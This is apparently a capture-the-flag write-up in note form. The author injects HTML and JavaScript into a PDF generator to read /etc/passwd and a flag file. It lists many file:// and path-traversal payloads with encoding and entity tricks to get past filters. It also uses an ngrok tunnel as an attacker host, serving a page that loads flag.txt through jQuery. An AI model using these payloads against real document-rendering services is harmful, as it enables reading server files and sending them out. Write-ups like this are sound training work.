
**Okay, so i can insert stuff in the PDF\. I need the flag\.  Or, maybe send it to me using ngrok etc???

Lets try these:**

\<script\>x=newXMLHttpRequest; x\.onload=function\(\)\{ document\.write\(this\.responseText\) \}; x\.open\("GET","file:///etc/passwd"\); x\.send\(\);\</script\>

\<img src="xasdasdasd"onerror="document\.write\('\<iframe src=file:///etc/passwd\>\</iframe\>'\)"/\>

\<script\>document\.write\('\<iframe src=file:///etc/passwd\>\</iframe\>'\);\</script\>


**It is not liking file:// so what else can I do here\.\.**

**Tried this instead:**



## <iframe src= 

[https://1dd3-216-93-199-231.ngrok.io](#https://1dd3-216-93-199-231.ngrok.io)


## /hi> 



**Working, tried to grab hi:**

ngrok                                                                                                                                 \(Ctrl\+C to quit\)

Session Status                online                                                                                                                  
Account                       crypticsilenc3 \(Plan: Free\)                                                                                             
Version                       3\.0\.3                                                                                                                   
Region                        United States \(us\)                                                                                                      
Latency                       85\.924097ms                                                                                                             
Web Interface                 [http://127.0.0.1:4040](#http://127.0.0.1:4040)

Forwarding                    [https://1dd3-216-93-199-231.ngrok.io](#https://1dd3-216-93-199-231.ngrok.io)
\-\> [http://localhost:12344](#http://localhost:12344)


Connections                   ttl     opn     rt1     rt5     p50     p90                                                                             
1       0       0\.00    0\.00    0\.01    0\.01                                                                            

HTTP Requests                                                                                                                                         
\-\-\-\-\-\-\-\-\-\-\-\-\-                                                                                                                                         

GET /hi                        404 File not found                                                                                                     


**So, lets try including the file a different way locally, with javascript instead??
**
\<script\>x=new XMLHttpRequest;x\.onload=function\(\)\{document\.write\(this\.responseText\)\};x\.open\("GET","file://\.\./\.\./flag\.txt"\);x\.send\(\);\</script\>


OR:

\<script\>
function readTextFile\(file\)\{  var rawFile = new XMLHttpRequest\(\);    rawFile\.open\("GET", file, false\);    rawFile\.onreadystatechange = function \(\)    \{        if\(rawFile\.readyState === 4\)        \{            if\(rawFile\.status === 200 || rawFile\.status == 0\)            \{                var allText = rawFile\.responseText;                alert\(allText\);            \}        \}    \}    rawFile\.send\(null\);
\}
\</script\>
readTextFile\("file:%2f%2f\.\.%2fflag\.txt"\);


**Still nada\.  back to simple\.\. Lets try:**

\<iframe src="\.\./\.\./flag\.txt"\>\</iframe\>

**That returned something hopeful:**

![](./images/071711c5efcedbf64ed95f090a80e454.png)


**Jesus\.  That easy? lol\.\. Lets remove one set of \.\./ and see****what this gets:**
\<iframe src="\.\./flag\.txt"\>\</iframe\>

\<iframe src="flag\.txt"\>\</iframe\>

**Same\. Need the file:// which blocks it\.\.
Tried uppercase for fILe yesterday, tried %2f%2f for the slashes, but haven't tried 
**\<iframe src=fILe%3A%2F%2F\.\./\.\./flag\.txt\>\</iframe\>**

No luck, empty 404 again\.\. This is different, maybe I just need some other test files with this\.\. Tried a known pdf
**\<iframe src="fILe%3A%2F%2F"\>\</iframe\>**

Took out the quotes and urlencoded just the \.\./\.\. : Hmmm, this is different, 400 error:
**\<iframe src=%2E%2E%2F%2E%2E%2Fflag\.txt\>\</iframe\>**

Tried HTML Entity:
**\<iframe src="fILe\&colon;\&sol;\&sol;\.\./\.\./flag\.txt"\>\</iframe\>

**Error, tried:**
\<iframe src="fILe\&colon;\&sol;\&sol;\.\.\&sol;\.\.\&sol;flag\.txt"\>\</iframe\>

**Okay, lets go back to URLencoding, maybe the whole thing urlencoded, and in markdown instead:**

**Tried a MD link:**
\[pic\]\(file%3A%2F%2F%2E%2E%2F%2E%2E%2Fflag%2Etxt\)

Weird:

![](./images/be958477541cca1dc693d091dedbdca2.png)

**Strange\. the mouseover for this doesn't match the web port my webserver is on:**

![](./images/799298f41fc127e36bdb6138156a7ce4.png)


**31839 is the webserver, but this linked to ‘localhost:36399’****Not sure why?**

**Tried just a raw:**

\[link\]\(/flag\.txt\)

Still just giving a link to it\. whatever\.

**Tried something diff, can use jquery to include a file, and maybe this will execute\.  Made a hi\.html on my server and used ngrok to link it in an iframe:**

GNU nano 5\.4                                                            hi\.html                                                                     
\<html\>
\<head\>
\<script src="[https://code.jquery.com/jquery-3.6.0.min.js"></script>](#https://code.jquery.com/jquery-3.6.0.min.js"></script>)

\<script\>
$\(function\(\)\{
$\("#includedContent1"\)\.load\("/flag\.txt"\);
$\("#includedContent2"\)\.load\("flag\.txt"\);
$\("#includedContent3"\)\.load\("\.\./flag\.txt"\);
$\("#includedContent4"\)\.load\("\.\./\.\./flag\.txt"\);
$\("#includedContent5"\)\.load\("\.\./\.\./\.\./flag\.txt"\);
\}\);
\</script\>
\</head\>

\<body\>
\<div id="includedContent1"\>\</div\>
\<div id="includedContent2"\>\</div\>
\<div id="includedContent3"\>\</div\>
\<div id="includedContent4"\>\</div\>
\<div id="includedContent5"\>\</div\>
\</body\>
\</html\>


**So, lets do this w/ ngrok\.\.
**
\<iframe src="https://b0f8\-216\-93\-199\-231\.ngrok\.io/?c="\>\</iframe\>



